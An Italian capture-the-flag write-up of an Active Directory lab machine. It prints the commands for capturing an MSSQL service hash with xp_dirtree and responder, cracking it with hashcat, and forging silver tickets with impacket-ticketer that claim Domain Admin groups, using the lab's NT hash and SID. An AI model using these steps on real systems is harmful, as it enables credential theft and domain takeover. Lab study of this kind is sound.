Inizio classica scansione:
```bash
sudo nmap -A --open -v -T4 -Pn 10.129.197.161 -oA Signed
```

Noto da subito che l'unica porta aperta è quella di `ms-sql`, quindi testo se sia possibile connettersi con le credenziali che abbiamo.

![[Pasted image 20251011220018.png]]

Possiamo connetterci come utente locale con le credenziali fornite, a questo punto lo faccio utilizzando `impacket-mssqulclient`.

![[Pasted image 20251011215953.png]]

Dato che siamo utenti `guest`, non possiamo fare una mazza: procedo dunque ad una tecnica mistica che ho scoperto: se setto un *responder* con `sudo responder -I tun0` ed in seguito dal `ms-sql` uso `xp_dirtree \\<mio_ip tun0>\<Cartella sul mio pc>` posso ottenere l'hash di `mssqlsvc` che posso in seguito provare a crackare.

![[Pasted image 20251011221155.png]]

Usiamo `hashcat` e specifichiamo `hash mode 5600` con `-m` per specificare che sia un hash NTLMv2, e grazie alla madonna otteniamo qualcosa:

![[Pasted image 20251011221811.png]]![[Pasted image 20251011221824.png]]

A questo punto, son potuto entrare nel `ms-sql` con l'utente `mssqlsvc` ma comunque le varie funzioni per spawnare shell o simili mi erano **precluse**. Dopo aver bestemmiato per una mezz'ora buona trovo questa **query** che mi permette di raccogliere dati utili:

```sql
SELECT name, sid, type, type_desc FROM sys.server_principals;
	
SIGNED\IT b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' b'G' WINDOWS_GROUP
```

Se riuscissi a trovare il *SID* del dominio, potrei **craftare** un `Silver ticket` da usare per entrare come admin. Cercando, dai risultati della query troviamo quello che sembra il *SID*. Andando ad utilizzare un programmino in *python*, lo convertiamo e notiamo che effettivamente lo è, dobbiamo solo rimuovere le ultime 4 cifre poiché sono del gruppo.

![[Pasted image 20251011234307.png]]

A questo punto, possiamo craftare il nostro *silver ticket*. Per farlo dobbiamo **convertire** la password dell'utente che abbiamo ottenuto in *nthash*, specificare poi il *domain sid* che abbiamo trovato, indicare il *dominio* oggetto, *spn* e infine la parte interessante, ovvero *gruppo* e *user id*. 

```bash
❯ impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/dc01.signed.htb -groups 1105 -user-id 500 Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
❯ export KRB5CCNAME=Administrator.ccache
```

Facendo ciò, possiamo esportarlo come *variabile d'ambiente*. Una volta che lo abbiamo esportato come variabile d'ambiente possiamo usarlo col parametro `-k -no-pass` per accedere al `ms-sql`.

```bash
❯ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
[*] INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> 
```

Come vediamo, ora siamo `dbo@master` e possiamo eseguire `xp_cmdshell` e via dicendo.
Facendo così al solito possiamo ottenere la *reverse shell*, e troviamo la *user flag*.

Cristo e la Madonna però non sembrano avere ancora pietà di noi, quindi non riusciamo a trovare alcun modo per poter fare **privilege escalation**.
Dopo un'ora di bestemmie, racconti sui lavori passati e presentazioni con uno sconosciuto, arriva dall'alto una soluzione: riusare la tecnica precedente **cambiando** i *groups* e lo *user id*.
(spiegazione in calce fatta dall'*AI* perché non sono in grado di spiegare)

```bash
❯ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 512,519,1105 -user-id 1103 mssqlsvc

❯ impacket-mssqlclient -k -no-pass dc01.signed.htb

❯ SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
```

Ora abbiamo i permessi essendo nel gruppo dei *Domain Admin* e possiamo leggere *root.txt*.

![[Pasted image 20251012005548.png]]



Spiegazione differenze nei *silver ticket*:

**Cos’è un Silver Ticket**

- È un TGS (service ticket) Kerberos creato manualmente usando l’hash NT dell’account di servizio e il Domain SID.
    
- Funziona solo per lo specifico SPN indicato: non dà controllo generale sul dominio, ma accesso al servizio bersaglio.
    

**Come viene costruito (concetto)**

- Serve l’NT hash dell’account di servizio (ottenuto qui via `xp_dirtree` → responder → crack) e il `domain SID`.
    
- Con strumenti tipo `impacket-ticketer` si genera un ticket che contiene, oltre all’identità, il PAC con la lista di gruppi (RIDs) e lo user-id.
    

**Perché il primo ticket non bastava per la root flag**

- Il primo ticket impersonava un utente (es. `Administrator`) verso MSSQL, garantendo privilegi **all’interno del DB** (dbo, abilitazione di `xp_cmdshell`) — sufficiente per la user flag.
    
- Però le operazioni che leggono `C:\Users\Administrator\Desktop\root.txt` vengono eseguite dal **processo del servizio** (`mssqlsvc`) a livello OS: se quel processo non è membro dei gruppi amministrativi locali/dominio, non potrà accedere ai file protetti anche se la connessione Kerberos “dice” che il client è Administrator.
    

**Perché il secondo ticket ha funzionato**

- Il secondo ticket è stato craftato cambiando `-groups` e `-user-id` in modo da far apparire **l’account di servizio** (`mssqlsvc`) come membro di gruppi privilegiati (es. 512 = Domain Admins, 519 = Enterprise Admins).
    
- Così il processo MSSQL, quando ha aperto file locali, aveva i privilegi OS necessari a leggere la root flag.
    

**Note pratiche**

- Alcuni RID sono _well-known_ (es. 500 = Administrator, 512 = Domain Admins, 519 = Enterprise Admins) e possono essere usati nei PAC; altri RID (es. 1103, 1105) sono specifici del dominio e variano tra installazioni.
    
- Per creare Silver Ticket affidabili è necessario: NT hash corretto, domain SID corretto e SPN esatto; la membership nel PAC è ciò che determina i privilegi effettivi sul servizio ricevente.